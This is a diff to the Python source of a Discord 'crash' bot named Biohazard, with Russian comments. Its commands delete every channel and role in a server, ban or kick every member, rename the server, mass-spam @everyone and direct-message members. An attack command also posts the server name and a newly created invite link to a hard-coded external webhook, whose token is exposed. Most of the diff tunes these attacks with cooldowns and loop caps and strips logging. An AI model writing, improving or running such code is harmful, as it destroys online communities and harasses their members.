@@ -1,3 +1,4 @@
+cdn = 0
 import discord
 import asyncio
 from discord.ext import commands
@@ -13,6 +14,7 @@ class MyClient(discord.Client):
 		await client.change_presence(activity = discord.Game('Крутой бот | v2.6'))
 		
 	async def on_message(self, message):
+		global cdn
 		c = 0
 		r = 0
 		m = 0
@@ -20,8 +22,7 @@ class MyClient(discord.Client):
 		white = open('whitelist.txt', 'r').read()
 		black = open('blacklist.txt', 'r').read()
 		vips = open('vip.txt', 'r').read()
-		print('{0.author} с сервера {0.guild.name} и канала {0.channel.name} сказал: {0.content}'.format(message))
-		if message.content == '*помощь': #помощь
+		if message.content == '*помощь': #помощь!!!
 			await message.delete()
 			embed = discord.Embed(title=":grey_question: Помощь", description="", color=0x00cc00)
 			embed.add_field(name='*атака', value='Автоматический краш сервера', inline=False)
@@ -129,16 +130,16 @@ class MyClient(discord.Client):
 					f.truncate()
 				await message.author.send(':white_check_mark:')
 		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
-			if message.content == '*атака': #автоматический краш
+			if message.content == '*атака' and cdn == 0: #автоматический краш
 				await message.delete() #удаление сообщения
+				cdn = 1
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
-				print('Атака на сервер', message.guild.name)
 				oi = await message.channel.create_invite(max_age=86400)
 				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны! **' + str(oi))
 				if message.guild.name != 'Biohazard CRASH' and len(message.guild.members) > 5:
 					response = webhook.execute()
 				await message.guild.edit(name='Biohazard CRASH') #переименовывание сервера
-				with open('chaos.jpeg', 'rb') as f:
+				with open('chaos.png', 'rb') as f:
 					icon = f.read()
 				await message.guild.edit(icon=icon)
 				
@@ -146,7 +147,6 @@ class MyClient(discord.Client):
 					await asyncio.sleep(0.1)
 					try:
 						await i.delete() #удаление всех каналов
-						print('Канал', i, 'удалён!')
 						c = c + 1
 					except:
 						pass
@@ -156,7 +156,6 @@ class MyClient(discord.Client):
 					try:
 						await i.delete() #удаление всех ролей
 						r = r + 1
-						print('Роль', i, 'удалена!')
 					except:
 						pass
 				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
@@ -165,7 +164,6 @@ class MyClient(discord.Client):
 					await asyncio.sleep(0.1)
 					try:
 						await i.ban() #бан всех участников
-						print('Участник', i, 'забанен!')
 						m = m + 1
 					except:
 						pass
@@ -173,7 +171,8 @@ class MyClient(discord.Client):
 				
 				await asyncio.sleep(0.1)
 				try:
-					while True:
+					while c < 500:
+						c += 1
 						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
 						#await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_category('Crash by Biohazard') #создание категории
@@ -181,21 +180,24 @@ class MyClient(discord.Client):
 						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
 				except:
 					pass
+				time.sleep(120)
+				cdn = 0
 				
-			if message.content == '*флуд': #флуд
+			if message.content == '*флуд' and cdn == 0: #флуд
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/APTCAAF'
 				await message.delete()
+				cdn = 1
 				while s <= 500:
 					for channel in message.guild.text_channels:
 						await channel.send(spam)
 						s = s + 1
+				cdn = 0
 			if message.content == '*всембан': #бан всех участников
 				await message.delete()
 				for i in message.guild.members:
 					await asyncio.sleep(0.1)
 					try:
 						await i.ban() #бан
-						print('Участник', i, 'забанен!')
 						m = m + 1
 					except:
 						pass
@@ -208,7 +210,6 @@ class MyClient(discord.Client):
 					try:
 						await i.kick() #кик
 						m = m + 1
-						print('Участник', i, 'кикнут!')
 					except:
 						pass
 				await message.author.send('**:boot: Участников кикнуто: **' + str(m))
@@ -218,47 +219,52 @@ class MyClient(discord.Client):
 				await asyncio.sleep(0.1)
 				try:
 					await message.guild.edit(name='Biohazard CRASH') #переименовывание
-					with open('chaos.jpeg', 'rb') as f:
+					with open('chaos.png', 'rb') as f:
 						icon = f.read()
 					await message.guild.edit(icon=icon)
 				except:
 					pass
 				
-			if message.content == '*каналы-': #удаление всех каналов
+			if message.content == '*каналы-' and cdn == 0: #удаление всех каналов
 				await message.delete()
+				cdn = 1
 				for i in message.guild.channels:
 					await asyncio.sleep(0.1)
 					try:
 						await i.delete() #удаление
-						print('Канал', i, 'удалён!')
 						c = c + 1
 					except:
 						pass
+				cdn = 0
 				await message.author.send('**:wastebasket: Каналов удалено: ** ' + str(c))
 				await message.guild.create_text_channel(name='chat')
 						
-			if message.content == '*роли-': #удаление всех ролей
+			if message.content == '*роли-' and cdn == 0: #удаление всех ролей
 				await message.delete()
+				cdn = 1
 				for i in message.guild.roles:
 					await asyncio.sleep(0.1)
 					try:
 						await i.delete() #удаление
-						print('Роль', i, 'удалена!')
 						r = r + 1
 					except:
 						pass
+				cdn = 0
 				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
 					
-			if message.content == '*каналы+': #бесконечное создание каналов и категорий
+			if message.content == '*каналы+' and cdn == 0: #бесконечное создание каналов и категорий
+				cdn = 1
 				await message.delete()
 				await asyncio.sleep(0.1)
 				try:
-					while True:
+					while c < 500:
+						c += 1
 						await message.guild.create_text_channel(name='crash-by-biohazard') #создание текстового канала
 						await message.guild.create_category(name='Crash by Biohazard') #создание категории
 						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
 				except:
 					pass
+				cdn = 0
 				
 			if message.content == '*заразаканалы': #переименовывание всех каналов
 				await message.delete()
@@ -266,7 +272,6 @@ class MyClient(discord.Client):
 					await asyncio.sleep(0.1)
 					try:
 						await i.edit(name='Crash by Biohazard') #переименовывание
-						print('Канал', i, 'переименован!')
 						c = c + 1
 					except:
 						pass
@@ -278,20 +283,22 @@ class MyClient(discord.Client):
 					await asyncio.sleep(0.1)
 					try:
 						await i.edit(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #переименовывание
-						print('Роль', i, 'переименована!')
 						r = r + 1
 					except:
 						pass
 				await message.author.send('**:microbe: Ролей заражено: **' + str(r))
 					
-			if message.content == '*роли+': #бесконечное создание ролей
+			if message.content == '*роли+' and cdn == 0: #бесконечное создание ролей
+				cdn = 1
 				await message.delete()
 				await asyncio.sleep(0.1)
 				try:
-					while True:
+					while r < 250:
 						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
+						r += 1
 				except:
 					pass
+				cdn = 0
 					
 			if message.content == '*канал-': #удаление текущего канала
 				await message.delete()
@@ -303,19 +310,14 @@ class MyClient(discord.Client):
 				await message.channel.edit(name='crash-by-biohazard')
 				await message.author.send(':microbe: **Канал** `' + str(message.channel) + '` **заражён!**')
 				
-			if message.content == '*админка': #выдаёт админку
-				await message.delete()
-				await message.guild.create_role(name="Adminka", permissions=discord.Permissions.all())
-				
-				
 			if message.content == '*лс':
 				await message.delete()
 				for i in message.guild.members:
 					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/APTCAAF'.format(message))
 					
-			if message.content == '*лаги': #лаги
+			if message.content == '*лаги' and cdn == 0: #лаги
 				await message.delete()
-				
+				cdn = 1
 				embed = discord.Embed(title=":biohazard: КРАШ!!!", description="", color=0x00cc00)
 				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
 				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
@@ -330,6 +332,7 @@ class MyClient(discord.Client):
 					for i in message.guild.text_channels:
 						await i.send('@everyone', embed=embed)
 						s += 1
+				cdn = 0
 					
 					
 			if vips.find(str(message.author.id)) != -1:
@@ -361,7 +364,7 @@ class MyClient(discord.Client):
 				if message.content.startswith('*виппереименовать'):
 					await message.delete()
 					n = message.content.replace('*виппереименовать', '')
-					with open('chaos.jpeg', 'rb') as f:
+					with open('chaos.png', 'rb') as f:
 						icon = f.read()
 					await message.guild.edit(name=n, icon=icon)
 					
@@ -372,59 +375,6 @@ class MyClient(discord.Client):
 						for channel in message.guild.text_channels:
 							await channel.send(n)
 							s = s + 1
-							
-				if message.content.startswith('*випатака'):
-					await message.delete()
-					n = message.content.replace('*випатака', '')
-					print('Атака на сервер', message.guild.name)
-					webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
-					if message.guild.name != '__...-<<CRASHED>>-...__' and len(message.guild.members) > 5:
-						response = webhook.execute()
-					await message.guild.edit(name=str(r)) #переименовывание сервера
-					with open('chaos.jpeg', 'rb') as f:
-						icon = f.read()
-					await message.guild.edit(icon=icon)
-				
-					for i in message.guild.channels:
-						await asyncio.sleep(0.1)
-						try:
-							await i.delete() #удаление всех каналов
-							print('Канал', i, 'удалён!')
-							c = c + 1
-						except:
-							pass
-					await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
-					for i in message.guild.roles:
-						await asyncio.sleep(0.1)
-						try:
-							await i.delete() #удаление всех ролей
-							r = r + 1
-							print('Роль', i, 'удалена!')
-						except:
-							pass
-					await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
-					
-					for i in message.guild.members:
-						await asyncio.sleep(0.1)
-						try:
-							await i.ban() #бан всех участников
-							print('Участник', i, 'забанен!')
-							m = m + 1
-						except:
-							pass
-					await message.author.send('**:hammer: Участников забанено: **' + str(m))
-				
-					await asyncio.sleep(0.1)
-					try:
-						while True:
-							await message.guild.create_text_channel(str(r)) #создание текстового канала
-							await message.guild.create_category(str(r)) #создание категории
-							await message.guild.create_voice_channel(name=str(r)) #создание голосового канала
-							await message.guild.create_role(name=str(r), colour=discord.Colour(0x00cc00)) #создание роли
-					except:
-						pass
-			
-					
 
 client = MyClient()
 client.run(str(token))
